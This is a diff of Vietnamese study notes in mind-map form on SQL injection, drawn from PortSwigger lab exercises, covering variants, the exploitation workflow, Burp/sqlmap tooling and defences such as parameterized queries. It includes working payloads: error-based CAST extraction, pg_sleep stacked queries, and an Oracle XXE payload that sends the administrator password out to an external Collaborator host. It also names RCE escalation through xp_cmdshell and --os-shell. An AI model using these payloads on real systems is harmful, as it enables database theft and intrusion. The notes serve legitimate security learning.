@@ -1,204 +1,201 @@
 # MIND MAP — SQL INJECTION (SQLi)
-
-## NHÁNH 1 — BẢN CHẤT & ROOT CAUSE
-- Định nghĩa
-  - Lỗ hổng cho phép attacker chèn/sửa đổi câu lệnh SQL mà ứng dụng gửi tới database
-  - Hệ quả: đọc/sửa/xóa dữ liệu ngoài phạm vi cho phép, bypass auth, đôi khi RCE
-- Root cause
-  - Input của user bị **nối chuỗi trực tiếp (string concatenation)** vào câu lệnh SQL
-  - Input không được tách biệt giữa "data" và "code" → bị **diễn giải thành cú pháp SQL** (operator, keyword, statement terminator)
-  - Ký tự đặc biệt (`'`, `"`, `;`, `--`, `/* */`) phá vỡ ranh giới string literal → chèn logic mới
-- Component bị đánh lừa
-  - **SQL parser / query engine của DBMS** (không phải web server, không phải application layer)
-  - Parser không phân biệt được "chuỗi do dev viết" vs "chuỗi do input tạo ra" vì cả hai đến cùng một kênh văn bản thuần
+*(Tổng hợp từ 17 lab đã hoàn thành trên PortSwigger Web Security Academy)*
 
 ---
 
-## NHÁNH 2 — PHÂN LOẠI CÁC BIẾN THỂ (theo danh mục PortSwigger)
-- **In-band — Retrieve hidden data**
-  - Dấu hiệu: sửa logic `WHERE` để trả về dữ liệu ẩn
-  - Điều kiện: kết quả query hiển thị trực tiếp trên response
-- **In-band — UNION attack**
-  - Dấu hiệu: dùng `UNION SELECT` để gộp thêm dữ liệu tùy ý vào output
-  - Điều kiện: số cột + kiểu dữ liệu tương thích với query gốc, output hiển thị được
-- **In-band — Login bypass**
-  - Dấu hiệu: sửa logic điều kiện auth (`OR 1=1`)
-  - Điều kiện: injection nằm trong query xác thực
-- **Error-based (Visible error-based)**
-  - Dấu hiệu: DB trả verbose error message chứa dữ liệu (qua `CAST()`/`CONVERT()` ép kiểu sai)
-  - Điều kiện: ứng dụng không suppress lỗi DB, lỗi được trả về response
-  - **Cơ chế CAST ép lỗi có chủ đích:** `AND 1=CAST((SELECT <cột> FROM <bảng> LIMIT 1) AS int)--`
-    - Ép giá trị text (username/password...) sang kiểu `int` không tương thích → DB throw lỗi convert
-    - Nhiều DB engine **in kèm chính giá trị gây lỗi** vào error message (VD Postgres: `invalid input syntax for type integer: "administrator"`) → biến lỗi thành **kênh rò rỉ dữ liệu**, không chỉ là tín hiệu true/false như Conditional Errors (Lab 12)
-    - Khác biệt cốt lõi so với Conditional Errors: ở đây bạn **không quan tâm** biểu thức `1 = CAST(...)` đúng hay sai — mục tiêu là ép lỗi xảy ra để đọc nội dung, không phải để so sánh 2 trạng thái
-    - Quy trình build payload incremental (dò cấu trúc query gốc qua chính error message): `'` → xác nhận injectable + lộ query gốc → `'--` → xác nhận lại cú pháp hợp lệ → `AND CAST((SELECT 1) AS int)` thiếu `=` → lộ ra `AND` cần biểu thức boolean → thêm `1=` → query hợp lệ, sẵn sàng nhét subquery thật
-    - `LIMIT 1` vẫn cần thiết (giống Lab 11) để tránh lỗi "more than one row" che mất lỗi CAST thật sự muốn thấy
-    - Giới hạn độ dài input (cookie/param) có thể cắt mất phần comment `--` khi payload dài → cần rút gọn phần giá trị gốc không cần thiết để nhường chỗ
-    - **Bẫy thực chiến — DBMS không tự ép ngầm kiểu (implicit type coercion) như nhau:** PostgreSQL bắt buộc `AND` phải nhận đúng biểu thức kiểu `boolean` — `CAST(x AS int)` đơn thuần trả về `integer`, không tự động được hiểu là TRUE/FALSE (khác MySQL, nơi số khác 0 coi là TRUE) → bắt buộc phải viết `1=CAST(...)` để tạo ra biểu thức boolean hợp lệ, nếu không sẽ gặp lỗi cú pháp `argument of AND must be type boolean, not type integer`
-    - **Bẫy gõ nhầm `''` (double single-quote):** trong SQL, `''` bên trong 1 string literal là ký tự escape cho 1 dấu nháy đơn thật, **không đóng chuỗi** — nếu vô tình gõ `''` thay vì `'` khi tách injection point, toàn bộ phần payload phía sau bị DB hiểu nhầm là văn bản nằm trong chuỗi (không phải cú pháp SQL) → tạo ra false positive (200 OK) dù payload chưa hề được thực thi đúng ý. Luôn kiểm tra tab **Raw** trong Burp để đếm chính xác số dấu nháy, đừng tin vào tab Pretty.
-    - **DBMS fingerprint qua chữ ký lỗi:** PostgreSQL có định dạng lỗi đặc trưng `ERROR: <message>  Position: N` (khác Oracle `ORA-xxxxx`, MySQL "You have an error in your SQL syntax", MSSQL "Incorrect syntax near...") — dùng ngay error message đầu tiên để fingerprint DBMS, không cần đợi tới bước `version()`/`banner` riêng
-- **Blind — Conditional responses (Boolean-based)**
-  - Dấu hiệu: response khác biệt (nội dung/độ dài) giữa điều kiện TRUE/FALSE, không có error, không có data trực tiếp
-  - Điều kiện: có thể inject điều kiện boolean vào query ảnh hưởng luồng hiển thị
-- **Blind — Conditional errors**
-  - Dấu hiệu: không có sự khác biệt nội dung, nhưng TRUE/FALSE tạo ra **HTTP status khác nhau** (200 vs 500) do query lỗi có chủ đích
-  - Điều kiện: có thể trigger lỗi DB có điều kiện (`CASE WHEN ... THEN error ELSE ok END`)
-- **Blind — Time delays**
-  - Dấu hiệu: response time khác biệt dựa trên điều kiện (`pg_sleep`, `WAITFOR DELAY`, `dbms_pipe.receive_message`)
-  - Điều kiện: không có bất kỳ side channel nào khác (không error, không content diff)
-  - **Đã hoàn thành (PostgreSQL):** `x'||pg_sleep(10)--` — dùng `||` (string concat Postgres/Oracle, KHÔNG phải OR) để ép DB phải evaluate `pg_sleep()` như 1 phần bắt buộc của biểu thức, không cần so sánh đúng/sai
-- **Blind — Time delays + information retrieval**
-  - Dấu hiệu: dùng time-based làm oracle để leak từng ký tự dữ liệu
-  - Điều kiện: cần điều kiện hóa delay theo giá trị ký tự đang test
-  - **Đã thực hành (PostgreSQL) — stacked query + CASE WHEN:**
-    - Cơ chế: `x';SELECT CASE WHEN (<đk>) THEN pg_sleep(N) ELSE pg_sleep(0) END FROM users--`
-    - Dấu `;` mở **stacked query** — đóng hẳn câu SQL gốc, mở 1 câu SELECT hoàn toàn mới chạy tuần tự sau đó. Khác về bản chất so với `CASE WHEN` lồng trong `AND (...)` như Lab 12 (Oracle) — ở đó vẫn là 1 câu query duy nhất, còn đây là 2 câu lệnh riêng biệt được driver Postgres cho phép chạy nối tiếp.
-    - **Bẫy quan trọng — dấu `;` bị chính tầng Cookie header nuốt mất, không phải do SQL:** Cookie header dùng `;` làm delimiter phân tách nhiều cặp `name=value`. Nếu gửi `;` sống (chưa encode `%3B`), parser cookie cắt đứt giá trị `TrackingId` ngay tại dấu `;` đó — toàn bộ phần payload phía sau (`SELECT CASE WHEN...`) **không bao giờ chạm tới SQL parser**, bị chặn đứng sớm hơn 1 tầng. Triệu chứng: mọi điều kiện (`1=1` lẫn `1=2`) đều phản hồi nhanh như nhau — vì thực chất chưa có gì được thực thi. Cách phát hiện: xem tab Raw, thấy `;` trần chưa được encode. Cách sửa: bôi đen toàn bộ payload rồi Ctrl+U đúng 1 lần để `;`→`%3B`, khoảng trắng→`+`.
-- **Blind — Out-of-band interaction (OAST)**
-  - Dấu hiệu: trigger DNS/HTTP lookup ra ngoài (Burp Collaborator) khi query chạy
-  - Điều kiện: DB có function network (`UTL_HTTP`, `xp_dirtree`), không có side channel in-band nào khả dụng
-- **Blind — Out-of-band data exfiltration**
-  - Dấu hiệu: nhúng dữ liệu leak vào chính request OAST (subdomain, URL path)
-  - Điều kiện: giống trên + có thể nối dữ liệu vào chuỗi gọi ra ngoài
-  - **Đã hoàn thành (Oracle) — SQLi lồng XXE, xem LAB16_...md:**
-    - Điều kiện đặc thù của lab: query chạy **async**, không ảnh hưởng response → mọi in-band channel (content/status/error/time) đều vô hiệu, kể cả time-based (khác Lab 14 — ở đó time-based còn dùng được vì query blocking response)
-    - Oracle không có network function đơn giản như `xp_dirtree` (MSSQL) → phải mượn cơ chế **XXE** qua `EXTRACTVALUE(xmltype('<XML chứa external DTD entity SYSTEM "http://...">'),'/l')`
-    - Cơ chế: khai báo `<!ENTITY % remote SYSTEM "http://...">` rồi gọi `%remote;` → ép XML parser của Oracle tự fetch URL ngay lúc parse → DB server tự làm HTTP/DNS client
-    - **Kỹ thuật exfiltrate:** dùng `||` (concat Oracle) nối kết quả subquery **vào ngay trong URL bị gọi**: `"http://'||(SELECT password FROM users WHERE username='administrator')||'.SUBDOMAIN/"` → subdomain nhận được tại Collaborator chính là `<password>.<subdomain>` → đọc thẳng, không cần dò từng ký tự (1 request/giá trị, giống tốc độ Visible error-based Lab 18 nhưng qua kênh OOB)
-    - **Bẫy thực chiến:** bôi đen sai vùng trước khi "Insert Collaborator payload" (bôi cả URL thay vì chỉ bôi đúng placeholder subdomain) → Burp thay thế đè lên, xóa mất đoạn `'||(SELECT password...)||'` → vẫn có interaction (chứng minh injectable) nhưng Host header chỉ có subdomain trơn, không leak được gì. Cách tránh: gõ payload với placeholder text trước, chỉ bôi đen chính xác placeholder rồi mới Insert.
-    - Yêu cầu bắt buộc: Burp Suite Professional (Collaborator client không có ở Community)
-- **Second-order SQL injection**
-  - Dấu hiệu: payload lưu vào DB ở request A, kích hoạt injection ở request B (nơi giá trị được dùng lại trong query khác)
-  - Điều kiện: có 2 điểm tách biệt — điểm lưu và điểm sử dụng lại dữ liệu trong query
-- **SQLi filter bypass (WAF/input validation evasion)**
-  - Dấu hiệu: input bị filter chặn từ khóa, nhưng vẫn bypass được qua encoding/case/comment trick
-  - Điều kiện: filter dạng blocklist, không phải parameterized query
+## NHÁNH 1 — BẢN CHẤT & ROOT CAUSE
+
+### Định nghĩa
+SQL Injection là lỗ hổng cho phép attacker chèn hoặc sửa đổi câu lệnh SQL mà ứng dụng gửi tới database, thông qua việc kiểm soát một phần nội dung của câu lệnh đó qua input (tham số URL, cookie, header, body...). Hệ quả: đọc/sửa/xóa dữ liệu ngoài phạm vi cho phép, bypass authentication, và trong trường hợp xấu nhất là RCE (qua stacked queries + hàm hệ thống của DBMS).
+
+### Root cause
+- Input của user bị **nối chuỗi trực tiếp (string concatenation)** vào câu lệnh SQL, thay vì được truyền qua **parameterized query / prepared statement**.
+- Input **không được tách biệt giữa "data" và "code"** → khi input chứa ký tự đặc biệt (`'`, `"`, `;`, `--`, `#`, `/* */`), nó phá vỡ ranh giới string literal và bị **diễn giải lại thành cú pháp SQL mới** (operator `OR`/`AND`, statement terminator `;`, comment `--`/`#`...).
+- Input bị coi là "an toàn ngầm" chỉ vì nguồn gốc của nó (VD: cookie do chính server sinh ra ban đầu — Lab 11) — nhưng thực tế **mọi input từ client đều nằm trong tầm kiểm soát của attacker** (query param, body, header, cookie đều có thể sửa qua Burp), không phân biệt "trusted" hay "untrusted" theo nguồn.
+
+### Component bị đánh lừa
+- **SQL parser / query engine của DBMS** — không phải web server, không phải application layer. Đây là điểm mấu chốt: dù ứng dụng có validate input ở tầng code, nếu chuỗi cuối cùng đưa tới DBMS vẫn được ghép bằng string concatenation, injection point vẫn tồn tại.
+- Parser không phân biệt được "chuỗi cú pháp do dev viết sẵn" vs "chuỗi dữ liệu do input tạo ra" — vì cả hai đến cùng một kênh văn bản thuần (câu SQL hoàn chỉnh dạng string) tại thời điểm parser nhận được nó.
+- Ở Lab 17 (filter bypass qua XML encoding), có thêm 1 lớp bị đánh lừa khác: **WAF (pattern matcher ở tầng network)** — WAF quét dữ liệu *trước khi* XML parser decode entity, trong khi SQL engine chỉ nhận dữ liệu *sau khi* decode → 2 tầng nhìn thấy 2 dạng khác nhau của cùng 1 input (parser differential).
+
+---
+
+## NHÁNH 2 — PHÂN LOẠI CÁC BIẾN THỂ
+
+### In-band — Retrieve hidden data *(Lab 1)*
+- **Dấu hiệu:** sửa logic `WHERE` (thêm `OR 1=1--`) để vô hiệu hóa điều kiện lọc ẩn (`AND released=1`), trả về dữ liệu vốn không hiển thị.
+- **Điều kiện khai thác:** kết quả injection hiển thị **trực tiếp** trên response — không cần side-channel gián tiếp nào.
+
+### In-band — Login bypass *(Lab 2)*
+- **Dấu hiệu:** sửa logic điều kiện xác thực (`administrator'--`) để cắt bỏ hẳn điều kiện `AND password='...'` bằng comment, thay vì cố "thắng" nó bằng `OR`.
+- **Điều kiện khai thác:** injection point nằm ngay trong câu query dùng cho luồng authentication, và ứng dụng coi "query trả về ≥1 dòng" = "đăng nhập thành công".
+
+### In-band — UNION attack *(Lab 3, 4, 5, 6, 7, 8, 9, 10)*
+- **Dấu hiệu:** dùng `UNION SELECT` để ghép thêm 1 câu SELECT hoàn toàn mới vào kết quả trả về, đọc dữ liệu không thuộc bảng gốc.
+- **Điều kiện khai thác:** (1) số cột của 2 câu SELECT phải khớp tuyệt đối (Lab 3), (2) kiểu dữ liệu từng vị trí cột phải tương thích (Lab 4), (3) kết quả UNION phải hiển thị ra response.
+- **Biến thể phụ:**
+  - Đọc dữ liệu từ bảng biết trước tên (Lab 5) vs bảng có tên ngẫu nhiên phải tự dò qua `information_schema`/`all_tables` (Lab 9, 10).
+  - Gộp nhiều giá trị vào 1 cột bằng string concatenation khi số cột nhận text bị giới hạn (Lab 6).
+  - Fingerprint DBMS type & version qua UNION (Lab 7 Oracle, Lab 8 MySQL/MSSQL) — cú pháp khác biệt hoàn toàn giữa các DBMS dù cùng kỹ thuật.
+
+### Error-based — Visible error-based *(Lab 18)*
+- **Dấu hiệu:** ép DB throw lỗi convert kiểu có chủ đích (`CAST(text AS int)`), và DBMS **in kèm chính giá trị gây lỗi** vào error message → đọc được nguyên 1 giá trị/request, không cần brute-force.
+- **Điều kiện khai thác:** ứng dụng không suppress verbose error, DBMS có hành vi in giá trị lỗi vào message (PostgreSQL: `invalid input syntax for type integer: "administrator"`).
+
+### SQLi filter bypass (WAF/input validation evasion) *(Lab 17)*
+- **Dấu hiệu:** input bị WAF chặn theo pattern (`'`, `UNION`, `SELECT`), nhưng bypass được bằng cách encode payload thành XML character entity (`&#x55;...`) — WAF quét raw bytes trước decode, còn XML parser + SQL engine chỉ nhận dữ liệu sau decode.
+- **Điều kiện khai thác:** input đi qua 1 tầng có cơ chế encode/decode riêng (ở đây là XML), và WAF hoạt động dạng blocklist theo pattern thay vì decode-rồi-mới-quét.
+
+### Blind — Conditional responses (Boolean-based) *(Lab 11)*
+- **Dấu hiệu:** response khác biệt về nội dung (`Welcome back` có/không) giữa điều kiện TRUE/FALSE, không có error, không có data trực tiếp.
+- **Điều kiện khai thác:** có thể inject điều kiện boolean (`AND (subquery)='x'`) vào query ảnh hưởng tới việc có/không có dòng trả về, từ đó ảnh hưởng luồng hiển thị.
+
+### Blind — Conditional errors *(Lab 12)*
+- **Dấu hiệu:** không có khác biệt nội dung, nhưng TRUE/FALSE tạo ra HTTP status khác nhau (200 vs 500) do query lỗi có chủ đích.
+- **Điều kiện khai thác:** có thể trigger lỗi DB có điều kiện (`CASE WHEN (đk) THEN 1 ELSE 1/0 END`) — biến bài toán boolean thành bài toán "lỗi/không lỗi".
+
+### Blind — Time delays *(Lab 13)*
+- **Dấu hiệu:** response time khác biệt dựa trên điều kiện (`pg_sleep()`, `WAITFOR DELAY`, `dbms_pipe.receive_message()`).
+- **Điều kiện khai thác:** không có bất kỳ side-channel nào khác (không error, không content diff) — đây là oracle tổng quát nhất vì DB thực thi query đồng bộ (server phải chờ xong mới render trang).
+
+### Blind — Time delays + information retrieval *(Lab 14)*
+- **Dấu hiệu:** dùng time-based làm oracle để leak từng ký tự dữ liệu thật (không chỉ chứng minh injectable).
+- **Điều kiện khai thác:** cần điều kiện hóa delay theo giá trị ký tự đang test (`CASE WHEN (SUBSTRING(password,i,1)='x') THEN pg_sleep(N) ELSE pg_sleep(0) END`), qua stacked query (`;`).
+
+### Blind — Out-of-band interaction (OAST) *(Lab 15)*
+- **Dấu hiệu:** trigger DNS/HTTP lookup ra ngoài (Burp Collaborator) khi query chạy, chỉ để **chứng minh injectable** — chưa đọc dữ liệu thật.
+- **Điều kiện khai thác:** query chạy **bất đồng bộ (async)**, khiến mọi in-band channel (content/status/error/time) đều vô hiệu; DB không có network function đơn giản (Oracle) → phải mượn cơ chế XXE (`EXTRACTVALUE(xmltype(...), '/l')` + external DTD entity).
+
+### Blind — Out-of-band data exfiltration *(Lab 16)*
+- **Dấu hiệu:** nhúng dữ liệu leak thật vào chính request OAST (subdomain) bằng string concatenation (`||`).
+- **Điều kiện khai thác:** giống Lab 15 (query async, không side-channel in-band nào khả dụng) + có thể nối kết quả subquery vào chuỗi URL bị gọi ra ngoài — đọc được nguyên 1 giá trị/request qua Collaborator thay vì dò từng ký tự.
+
+### Second-order SQL injection *(chưa thực hành)*
+- **Dấu hiệu:** payload lưu vào DB ở request A (vô hại tại thời điểm lưu), kích hoạt injection ở request B khi giá trị đó được dùng lại trong 1 câu query khác.
+- **Điều kiện khai thác:** có 2 điểm tách biệt — điểm lưu dữ liệu và điểm sử dụng lại dữ liệu đó trong query, và điểm sử dụng lại không parameterize.
 
 ---
 
 ## NHÁNH 3 — QUY TRÌNH KHAI THÁC (từng bước)
-- **Bước 1: Xác định điểm inject**
-  - Test tất cả input surface: URL param, cookie, header (User-Agent, X-Forwarded-For), JSON/XML body, batch/search params
-  - Payload dò: `'`, `''`, `\`, `;`, khoảng trắng bất thường → quan sát lỗi/thay đổi hành vi
-- **Bước 2: Xác định loại/context**
-  - String context (trong `'...'`) vs Numeric context (không quote) vs Identifier context (tên cột/bảng)
-  - Câu query cho phép batched/stacked queries hay không (`;` có chạy statement thứ 2 không)
-  - In-band (thấy data) hay Blind (không thấy gì) → quyết định kỹ thuật tiếp theo
-- **Bước 3: Fingerprint môi trường**
-  - DBMS type: dựa vào error message signature, comment syntax (`--` vs `#`), string concat (`||` Oracle/Postgres, `+` MSSQL, `CONCAT()` MySQL)
-  - Version: `version()`, `banner` (Oracle `v$version`), `@@version` (MSSQL/MySQL)
-  - Đặc thù DBMS: Oracle bắt buộc `FROM dual`, cần `ROWNUM` cho pagination-style subquery
-- **Bước 4: Khai thác chính (leo thang)**
-  - Detect: xác nhận injectable qua boolean/error/time oracle
-  - Confirm & extract schema: liệt kê database, table, column (`information_schema` hoặc `all_tables`/`all_tab_columns` Oracle)
-  - Extract data: đọc từng dòng/từng ký tự (UNION nếu in-band; brute-force nhị phân nếu blind)
-  - Full impact / escalate: stacked queries → `xp_cmdshell` (MSSQL), `INTO OUTFILE` (MySQL), đọc file hệ thống → RCE nếu quyền DB cho phép
+
+### Bước 1 — Xác định điểm inject
+- Test tất cả input surface: URL param (`category` — Lab 1, 3-10), cookie (`TrackingId` — Lab 11, 12, 14, 15, 16, 18), body XML (`storeId` — Lab 17), form field (`username`/`password` — Lab 2).
+- Payload dò an toàn: dấu nháy đơn `'`, phép toán học không rõ ràng SQL (`1+1` — Lab 17, tránh WAF chặn ngay từ bước thăm dò), khoảng trắng bất thường → quan sát lỗi/thay đổi hành vi.
+- **Nguyên tắc quan trọng (rút từ Lab 17):** phải xác nhận injectable **riêng từng field**, không giả định mọi field trong cùng 1 request đều injectable như nhau — 1 field bị flag bởi WAF không có nghĩa nó thực sự injectable.
+
+### Bước 2 — Xác định loại/context
+- String context (trong `'...'`) vs Numeric context (không quote) vs Identifier context (tên cột/bảng).
+- Ứng dụng có phản hồi trực tiếp (in-band) hay không phản hồi gì khác biệt (blind) → quyết định nhánh kỹ thuật tiếp theo (Nhánh 2).
+- Kiểm tra khả năng stacked queries (`;` có chạy được statement thứ 2 không — Lab 14 dùng được trên PostgreSQL qua HTTP body, nhưng cần lưu ý tầng Cookie header cũng dùng `;` làm delimiter riêng, phải encode `%3B` trước khi tới được SQL layer).
+- Nếu có WAF/filter chặn cú pháp SQL rõ ràng (Lab 17): xác định filter hoạt động theo blocklist pattern, từ đó tìm cơ chế encode/decode mismatch giữa lớp filter và lớp xử lý thật (XML entity, URL encoding kép, Unicode...).
+
+### Bước 3 — Fingerprint môi trường
+- **DBMS type** dựa vào:
+  - Error message signature (Oracle `ORA-xxxxx`, PostgreSQL `ERROR: ... Position: N`, MySQL "You have an error in your SQL syntax", MSSQL "Incorrect syntax near...").
+  - Comment syntax: `--` (Oracle/MSSQL/Postgres, MySQL cần dấu cách theo sau) vs `#` (chỉ MySQL).
+  - Có bắt buộc `FROM` khi SELECT hằng số hay không: Oracle bắt buộc `FROM dual`, MySQL/MSSQL/Postgres không cần.
+  - String concat operator: `||` (Oracle/Postgres) vs `CONCAT()` (MySQL) vs `+` (MSSQL).
+- **Version:** `SELECT BANNER FROM v$version` (Oracle) / `SELECT @@version` (MySQL, MSSQL) / `SELECT version()` (PostgreSQL) — đọc qua UNION nếu in-band.
+- **Đặc thù DBMS khác:** Oracle cần `ROWNUM=1` thay cho `LIMIT 1` (Postgres/MySQL) khi ép subquery về đúng 1 dòng; Oracle dùng `all_tables`/`all_tab_columns` thay cho `information_schema.tables`/`information_schema.columns` (chuẩn ANSI, dùng cho non-Oracle).
+
+### Bước 4 — Khai thác chính (leo thang từ detect → extract → full impact)
+1. **Detect:** xác nhận injectable qua boolean oracle (`AND 1=1` vs `AND 1=0`), error oracle (`CASE WHEN...1/0`), hoặc time oracle (`pg_sleep`) — chọn oracle theo thứ tự ưu tiên: content diff > status diff > error message chứa data > time delay > OOB (chỉ dùng khi mọi kênh khác đều vô hiệu, VD query async).
+2. **Confirm & enumerate schema (nếu chưa biết tên bảng/cột):** liệt kê bảng (`information_schema.tables`/`all_tables`), liệt kê cột của bảng nghi ngờ (`information_schema.columns WHERE table_name=...`/`all_tab_columns WHERE table_name=...`).
+3. **Extract data:**
+   - In-band: đọc trực tiếp qua UNION, hoặc qua error message (visible error-based).
+   - Blind: brute-force nhị phân/tuần tự từng ký tự (`SUBSTRING(col,i,1)='x'`) bằng Intruder Sniper (1 vị trí, VD dò độ dài) hoặc Cluster bomb (2 vị trí, VD dò offset × ký tự).
+   - OOB: nối dữ liệu vào chuỗi gọi ra ngoài (`||`) để đọc nguyên giá trị/request qua Collaborator, không cần dò ký tự.
+4. **Full impact / escalate (chưa thực hành trong chuỗi lab này nhưng cần biết):** stacked queries → `xp_cmdshell` (MSSQL), `INTO OUTFILE` (MySQL), đọc/ghi file hệ thống → RCE nếu quyền DB account cho phép.
 
 ---
 
 ## NHÁNH 4 — PHÒNG CHỐNG (theo độ ưu tiên)
-- **Giải pháp gốc rễ**
-  - **Parameterized queries / Prepared statements (bind variables)**
-  - **Tại sao hiệu quả về cơ chế:** DB driver gửi câu lệnh SQL và dữ liệu **qua hai kênh tách biệt ở tầng giao thức** (query plan compile trước, data bind sau) → input **không bao giờ được parser SQL đọc như cú pháp**, dù chứa `'`, `;`, hay bất kỳ ký tự đặc biệt nào. Đây là loại bỏ injection channel tận gốc, không phải "chặn" payload.
-- **Giải pháp bổ sung (defense in depth)**
-  - Least privilege cho DB account (không cấp quyền DDL/xp_cmdshell cho account ứng dụng)
-  - Suppress verbose error message (ngăn error-based, nhưng KHÔNG chặn injection point — vẫn khai thác được qua blind/time/OOB)
-  - Input validation / allowlist kiểu dữ liệu (bổ trợ, không thay thế parameterization)
-  - WAF (chặn theo pattern, dễ bypass qua encoding/comment — chỉ là lớp chắn tạm thời)
-  - ORM sử dụng đúng cách (vẫn có thể bị injection nếu dùng raw query/string building trong ORM)
-- **So sánh cơ chế:**
-  - WAF/input validation = blocklist theo pattern → bypass được bằng biến thể payload
-  - Suppress error = chặn 1 side channel (error-based) → injection point vẫn tồn tại, chuyển sang blind/time/OOB
-  - Parameterized query = loại bỏ khả năng parser hiểu nhầm data thành code → không có "biến thể payload" nào bypass được vì input không đi qua bước parse cú pháp
+
+### Giải pháp gốc rễ — Parameterized queries / Prepared statements (bind variables)
+
+```php
+// ❌ SAI — string concatenation
+$query = "SELECT * FROM users WHERE username = '" . $u . "' AND password = '" . $p . "'";
+
+// ✅ ĐÚNG — parameterized query
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
+$stmt->execute([$u, $p]);
+```
+
+**Tại sao hiệu quả về mặt cơ chế (không chỉ "lọc ký tự"):**
+- DB driver gửi **câu lệnh SQL (query plan) và dữ liệu qua 2 kênh tách biệt ở tầng giao thức** — query được compile/parse trước với các placeholder (`?`), dữ liệu thật chỉ được "bind" vào sau khi cấu trúc câu lệnh đã cố định.
+- Vì vậy, input — dù chứa `'`, `;`, `--`, `UNION`, `OR 1=1`, hay bất kỳ cú pháp SQL nào — **không bao giờ được SQL parser đọc lại như cú pháp**, nó chỉ được xử lý như 1 giá trị dữ liệu thuần túy được gán vào đúng vị trí đã định sẵn.
+- Đây là loại bỏ **injection channel tận gốc** (không có "biến thể payload" nào bypass được, vì input không đi qua bước parse cú pháp nữa), khác hẳn với việc "chặn" hay "lọc" các payload đã biết — vốn luôn có nguy cơ bị bypass bằng payload biến thể chưa được liệt kê.
+- **Bằng chứng thực chiến (Lab 15/16):** dù attacker dùng kỹ thuật tinh vi tới đâu (XXE lồng trong SQLi, OOB qua DNS), gốc rễ vẫn luôn là injection point chưa parameterize — mọi biện pháp khác (suppress error, disable time delay, chặn network egress) chỉ chặn được **1 kênh lộ dữ liệu cụ thể**, không triệt tiêu được injection point.
+
+### Giải pháp bổ sung (defense in depth — không thay thế được giải pháp gốc rễ)
+
+| Biện pháp | Tác dụng | Giới hạn |
+|---|---|---|
+| **Least privilege cho DB account** | Hạn chế thiệt hại nếu injection vẫn xảy ra (không cấp quyền DDL, `xp_cmdshell`, đọc `information_schema`/`v$version` nếu không cần) | Không vá được injection point, chỉ giảm blast radius |
+| **Suppress verbose error message** | Ngăn được Error-based SQLi (Lab 18) | Injection point vẫn tồn tại, attacker chuyển sang blind/time/OOB (Lab 11-16) |
+| **Input validation / whitelist** | Chặn sớm ở tầng trước khi chạm SQL (VD `category` chỉ nhận 1 trong tập giá trị cố định) | Chỉ hiệu quả với input có định dạng cố định; không áp dụng được cho input tự do (VD nội dung bài viết) |
+| **WAF (Web Application Firewall)** | Chặn payload SQLi phổ biến theo pattern ở tầng network | Bản chất là blocklist — luôn có thể bypass bằng encoding/obfuscation mới (Lab 17 minh chứng: chỉ cần đổi encoding, không cần đổi logic payload) |
+| **ORM sử dụng đúng cách** | Mặc định dùng parameterized query phía dưới, giảm rủi ro tự nối chuỗi SQL thủ công | Vẫn có thể bị injection nếu dùng raw query/string building trong ORM |
+| **Hash password (bcrypt/argon2)** | Dù bị leak qua SQLi, giá trị leak ra là hash chứ không phải plaintext | Không ngăn được injection, chỉ giảm impact của riêng dữ liệu password |
+| **Vô hiệu hóa external entity resolution trong XML parser** | Chặn vector XXE cụ thể dùng trong OOB (Lab 15/16) | Không vá injection point gốc, chỉ chặn 1 kỹ thuật tạo network call cụ thể |
+
+### So sánh cơ chế các lớp phòng thủ
+- **WAF / input validation (blocklist)** = kiểm tra theo pattern → luôn có nguy cơ bị bypass bằng biến thể payload chưa biết (encoding, case, comment trick).
+- **Suppress error** = chặn đúng 1 side-channel (error-based) → injection point vẫn tồn tại nguyên vẹn, chỉ đổi kỹ thuật khai thác sang blind/time/OOB.
+- **Parameterized query** = loại bỏ khả năng parser hiểu nhầm data thành code **ngay từ gốc** → không có "biến thể payload" nào bypass được, vì input không còn đi qua bước parse cú pháp SQL nữa.
 
 ---
 
 ## NHÁNH 5 — TOOLING & TỐI ƯU THỜI GIAN
-- **sqlmap**
-  - `--technique=E` → error-based (khi có verbose error như lab "Visible error-based")
-  - `--technique=B` → boolean blind
-  - `--technique=T` → time-based blind
-  - `--technique=U` → UNION-based
-  - `--technique=S` → stacked queries
-  - `--dbms=oracle` → skip fingerprint, dùng đúng syntax Oracle (`FROM dual`, `ROWNUM`) ngay từ đầu, giảm request thừa
-  - `--risk`, `--level` → tăng độ sâu test (thêm payload, thêm vị trí header/cookie)
-  - `--os-shell` → escalate lên RCE nếu quyền DB cho phép
-- **Khi nào viết script Python riêng thay vì dùng tool**
-  - Cần **binary search** thay vì linear brute-force của Intruder/sqlmap mặc định → giảm số request từ O(n) xuống O(log n) mỗi ký tự
-  - Oracle conditional error cần logic `CASE WHEN` tùy biến không khớp pattern chuẩn của sqlmap
-  - Cần custom side-channel (VD: OOB payload ghép dữ liệu vào subdomain) mà tool không hỗ trợ sẵn
-  - Cần tốc độ cao qua async/concurrent requests, hoặc cần filter kết quả theo logic riêng
-- **Burp Repeater**
-  - Dùng để confirm thủ công từng bước: true/false, trigger error, đo response time baseline
-  - Dùng để tinh chỉnh payload trước khi đưa vào Intruder (tránh brute-force sai cú pháp)
-- **Burp Intruder**
-  - **Sniper**: brute-force từng ký tự tại 1 vị trí (VD: password character-by-character)
-  - **Cluster bomb**: khi cần test nhiều vị trí độc lập cùng lúc (VD: position + character)
-  - Filter kết quả: theo **status code** (conditional errors), theo **response length/Grep-Match keyword** (boolean-based), theo **response time** (time-based, cần đọc cột "Response received" hoặc dùng Turbo Intruder cho chính xác hơn)
-- **Resource pool — bắt buộc cho time-based Intruder (bài học thực chiến):**
-  - **Vì sao cần:** với oracle dạng nội dung/status (Lab 11/12), nhiều request chạy song song vẫn tự chứa đúng tín hiệu riêng của nó, không ảnh hưởng nhau. Nhưng với oracle dạng **thời gian**, nếu nhiều request "true" (đang sleep) chạy đồng thời, chúng tranh chấp connection/CPU ở DB → các sleep bị xếp hàng chồng lên nhau → thời gian đo được bị nhiễu, không còn phản ánh đúng 1 request = 1 lần sleep → dễ đọc sai kết quả (VD thực tế: dùng `pg_sleep(5)` mặc định 10 thread, ra tới 7 dòng "true" thay vì đúng 1 ranh giới).
-  - **Cách sửa:** tab Resource pool → Create new resource pool → tick "Maximum concurrent requests" = **1** → gán attack vào pool này. Sau khi ép single-thread, kết quả sạch lại ngay dù giữ nguyên giá trị sleep.
